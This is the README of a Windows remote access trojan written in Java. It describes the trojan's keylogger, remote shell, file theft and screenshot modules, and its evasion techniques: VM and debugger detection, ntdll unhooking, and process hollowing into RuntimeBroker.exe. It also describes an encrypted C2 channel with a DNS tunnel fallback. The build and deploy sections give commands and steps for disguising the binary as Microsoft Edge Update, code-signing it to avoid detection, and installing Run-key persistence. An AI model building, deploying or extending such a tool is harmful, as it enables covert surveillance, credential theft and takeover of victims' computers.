# RAT
JVM-resident Windows RAT — JNI keylogger, process hollowing, ntdll unhooking, AES-256-GCM C2 over HTTPS with DNS fallback.  rat  malware  java  jni  windows  red-team  process-hollowing  keylogger  c2  reverse-engineering

# sun-rt

A JVM-resident remote access trojan for Windows, written as a reference
implementation rather than a product. Package naming (`com.sun.rt`) mimics an
Oracle internal namespace so stack traces and `jar tf` output look unremarkable.

**Status:** research / reference. Not hardened. See [Limitations](#limitations).

## Design

Three trust layers, one-way flow between them: bootstrap has no network code,
the core runtime has no evasion code, modules have no crypto. A burned module
never exposes the transport key.

- **Bootstrap** — console suppression, single-instance lock, config decryption,
  anti-analysis gate, then evasion, persistence and module registration.
- **Core** — `Dispatcher` task queue, `Transport` (the only class that touches a
  socket), `Heartbeat` beacon loop, `DnsTunnel` fallback.
- **Modules** — shell, file browse/get/put, screenshot, keylogger.

Full architecture notes in [`docs/DESIGN.md`](docs/DESIGN.md).

### Evasion

| Technique | Where |
|---|---|
| SMBIOS + MAC OUI VM detection | `native/sysinfo.cpp` |
| `IsDebuggerPresent` / remote debugger check | `native/sysinfo.cpp` |
| Staged 90 s sandbox delay | `core/Gate.java` |
| `ntdll` `.text` unhooking via `\KnownDlls` | `native/unhook.cpp` |
| Process hollowing into `RuntimeBroker.exe` | `native/hollow.cpp` |
| Compile-time string encryption (AES-CTR) | `util/S.java`, `tools/strgen.py` |
| No console window | `javaw` + `hideConsole()` |

### C2

AES-256-GCM over HTTPS. Key derived per-message via HKDF-SHA256 from a shared
PSK and `sessionID||seq`, so captures don't replay across sessions. Payloads pad
to 4 KiB buckets so length stops leaking task type. Leaf SPKI pinning. Beacon
jitters ±40% around 60 s with exponential backoff to 15 min; after 3 failures the
transport degrades to DNS TXT records at ~40 bytes per query.

## Build

Requires JDK 8, `mingw-w64` (MSYS2), Python 3, and [Launch4j](https://launch4j.sourceforge.net/).

```bash
export JAVA_HOME=/path/to/jdk8
bash build.sh          # strings -> native DLL -> classes -> jar
launch4j launch4j.xml  # -> build/msedgeupd.exe
```

Sign it before deploying. Unsigned binaries are a bigger detection signal than
any code-level weakness here:

```bash
signtool sign /fd sha256 /a /tr http://timestamp.digicert.com /td sha256 build/msedgeupd.exe
```

## Deploy

1. Edit hosts, DNS zone and PSK in `core/Config.java`.
2. Place `msedgeupd.exe` and `msedgeupd.jar` in `%LOCALAPPDATA%\Microsoft\EdgeUpdate\`.
3. Run once. First launch sleeps 90 s by design, then installs persistence and
   beacons. Later launches pass `-boot` to skip the gate.

**Without a C2 server it does nothing visible.** It beacons at the placeholder
domain, fails, and backs off forever. Persistence still installs — check with:

```
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

## Limitations

- Hollowing requires a `payload.inc` produced from a built `stub.exe`, and the
  stub assumes a JRE at `%ProgramFiles%\Java\jre`. Bundled runtimes need edits.
- `NtUnmapViewOfSection` is called undeclared. Include `<winternl.h>` and drop
  the typedef if your SDK objects.
- Config encryption uses a hardcoded key. Fine for a dev loop, wrong for
  production.
- No TLS certificate generation, no operator UI, no browser credential theft.
- One architecture per build. Do not mix a 32-bit JVM with an x64 host.

## Layout

```
src/main/java/com/sun/rt/
├── Bootstrap.java       entry: gate, evasion, wiring
├── core/                Native bridge, transport, dispatch, persistence
├── mod/                 shell, files, screenshot, keylogger
└── util/                string decryption
src/main/native/         JNI: keyhook, hollowing, unhooking, sysinfo
tools/                   strgen.py, proguard.pro
```

## License

MIT. See [LICENSE](LICENSE).
